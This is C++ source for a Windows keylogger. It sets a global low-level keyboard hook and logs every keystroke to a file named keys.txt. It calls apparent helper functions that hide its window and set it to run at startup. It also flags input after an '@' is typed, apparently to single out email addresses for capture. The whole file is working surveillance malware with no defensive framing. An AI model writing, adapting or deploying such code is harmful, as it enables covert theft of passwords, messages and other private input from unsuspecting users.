#define _WIN32_WINNT 0x0500
#include "header.h"


using namespace std;


const string F_NAME = "keys.txt";

bool shiftPressed = false;
bool eFlag = false;

ofstream out(F_NAME, ios::out);


LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);


    // If a key is being pressed
    if (wParam == WM_KEYDOWN) {

        cout << p->vkCode << endl;


        switch (p->vkCode) {

            // Invisible keys
            case 160:		    //out << "<SHIFT>";
                                shiftPressed = true;    break;
            case 13:	        out << "<ENTER> ";
                                if(eFlag == true) {
                                    PE(out);
                                    eFlag = false;
                                }
                                ts(out);                   break;
            case 190:	        out << ".";		        break;
            case 188:	        out << ",";		        break;
            case 191:	        out << "/";		        break;
            case 186:	        out << ";";		        break;
            case 222:	        out << "'";		        break;
            case 219:	        out << "[";		        break;
            case 221:	        out << "]";		        break;
            case 220:	        out << "\\";		    break;
            case 189:	        out << "-";		        break;
            case 187:	        out << "=";		        break;
            case VK_CAPITAL:	out << "<CAPLOCK>";		break;
            case VK_LCONTROL:	out << "<LCTRL>";		break;
            case VK_RCONTROL:	out << "<RCTRL>";		break;
            case VK_INSERT:		out << "<INSERT>";		break;
            case VK_END:		out << "<END>";			break;
            case VK_DELETE:		out << "<DEL>";			break;
            case VK_BACK:		out << "<BK>";			break;
            case VK_TAB:		out << "<TAB>";			break;





                // Visible keys
            default:
                if(shiftPressed == true) {

                    //If shift is pressed and IS a digit
                    if(isdigit(char(p->vkCode))) {

                        switch(char(p->vkCode)) {

                            case '0': out << ")";   break;
                            case '1': out << "!";   break;
                            case '2': out << "@";
                                      eFlag = true; break;
                            case '3': out << "#";   break;
                            case '4': out << "$";   break;
                            case '5': out << "%";   break;
                            case '6': out << "^";   break;
                            case '7': out << "&";   break;
                            case '8': out << "*";   break;
                            case '9': out << "(";   break;

                            default:  out << char(toupper(p->vkCode));


                        }
                    }else {

                        //If shift if pressed and NOT a digit

                        switch(char(p->vkCode)) {
                        case ',': out << "<";   break;
                        case '.': out << ">";   break;
                        case '/': out << "?";   break;
                        case ';': out << ":";   break;
                        case '\'': out << "\"";   break;
                        case '[': out << "{";   break;
                        case ']': out << "}";   break;
                        case '-': out << "_";   break;
                        case '=': out << "+";   break;
                        case '\\': out << "|";   break;

                        default:  out << char(toupper(p->vkCode));
                        }
                    }



                }else {
                    //If shift pressed == false

                    out << char(tolower(p->vkCode));
                }



        }
    } else if (wParam == WM_KEYUP) {

        switch (p->vkCode) {
            case 160:		   // out << "<SHIFT-UP>";
                                shiftPressed = false;
                                break;
        }

    }

    out.flush();



    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {


    hyde();
    startUp(out);


    //Set windows keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(
            WH_KEYBOARD_LL,
            keyboardHookProc,
            hInstance,
            0);




    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);

        DispatchMessage(&msg);
    }
    return msg.wParam;


}
